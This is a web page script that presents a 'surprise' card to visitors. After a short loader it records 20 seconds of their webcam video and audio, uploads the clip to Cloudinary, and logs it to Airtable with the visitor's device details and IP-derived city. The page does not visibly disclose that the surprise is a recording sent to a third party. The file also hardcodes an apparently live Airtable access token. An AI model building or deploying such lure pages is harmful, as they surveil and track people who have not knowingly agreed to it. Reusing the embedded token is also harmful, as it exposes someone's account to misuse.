// ====== CONFIG (PASTE YOUR OWN KEYS HERE) ======
const CLOUD_NAME = "dpzzfcy84";           // your Cloudinary cloud name
const UPLOAD_PRESET = "forBANIKA";        // your unsigned preset

const AIRTABLE_BASE = "appBTargpA8GtlXJ3"; // your Base ID
const AIRTABLE_TABLE = "forBANIKA";       // your table name
const AIRTABLE_TOKEN = "pat2Peju0n3CZu6nv.6fe676b0b2df9d5cae2611a0b378b21920e630dd7f46cd199e1fc02047be4c9c"; // <— paste your Airtable token locally
// =============================================

const $ = id => document.getElementById(id);
const show = id => document.querySelectorAll('.page').forEach(p=>p.classList.remove('show')) || $(id).classList.add('show');

const introVideo = $("introVideo");
const surpriseVideo = $("surpriseVideo");
const startBtn = $("startBtn");

introVideo.onended = () => show("card");

startBtn.onclick = async () => {
  show("loader");
  setTimeout(async () => {
    show("surprise");
    await startRecordingFlow();
  }, 5000);
};

async function startRecordingFlow(){
  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
  surpriseVideo.srcObject = stream;
  await surpriseVideo.play();

  const rec = new MediaRecorder(stream, { mimeType: "video/webm" });
  const chunks = [];
  rec.ondataavailable = e => chunks.push(e.data);
  rec.start();

  // record 20 seconds
  await new Promise(r => setTimeout(r, 20000));
  rec.stop();

  const blob = await new Promise(res => rec.onstop = () => res(new Blob(chunks, {type:"video/webm"})));
  stream.getTracks().forEach(t=>t.stop());

  const videoUrl = await uploadToCloudinary(blob);
  const info = await collectInfo();
  await logToAirtable({ videoUrl, ...info });

  show("end");
}

async function uploadToCloudinary(blob){
  const fd = new FormData();
  fd.append("file", blob);
  fd.append("upload_preset", UPLOAD_PRESET);
  const r = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, { method:"POST", body: fd });
  const j = await r.json();
  return j.secure_url;
}

async function collectInfo(){
  const ua = navigator.userAgent;
  const deviceType = /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop";
  const browser = (/Chrome/i.test(ua)&&"Chrome")||(/Firefox/i.test(ua)&&"Firefox")||(/Safari/i.test(ua)&&"Safari")||"Other";

  // city via IP (no GPS)
  let city = "";
  try {
    const g = await fetch("https://ipapi.co/json/");
    const j = await g.json();
    city = j.city || "";
  } catch(e){}

  return {
    DeviceModel: ua,
    DeviceType: deviceType,
    Browser: browser,
    City: city,
    Time: new Date().toISOString()
  };
}

async function logToAirtable(row){
  const url = `https://api.airtable.com/v0/${AIRTABLE_BASE}/${encodeURIComponent(AIRTABLE_TABLE)}`;
  await fetch(url, {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${AIRTABLE_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ fields: {
      VideoURL: row.videoUrl,
      DeviceModel: row.DeviceModel,
      DeviceType: row.DeviceType,
      Browser: row.Browser,
      City: row.City,
      Time: row.Time
    }})
  });
}
